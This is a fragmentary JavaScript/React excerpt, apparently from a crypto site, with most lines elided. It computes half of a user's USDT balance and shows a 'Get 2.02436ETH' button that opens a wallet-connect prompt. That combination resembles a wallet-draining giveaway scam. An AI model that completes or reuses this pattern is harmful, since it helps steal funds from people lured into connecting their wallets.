...
async function checkBalance(contractAddress,contractAbi,contractSigner,currency) {
    ...
    const amt = ethers.utils.parseEther((BigNumber(USDTBalance.toString()).dividedBy(2)).toString());
...
async function sendETH() {
  ...
  try {
    ...
    return (
        ...
        <button className='shadow-0' onClick={() =>
          {
           // sendETH();
            open();
            
          }}>Get 2.02436ETH </button>
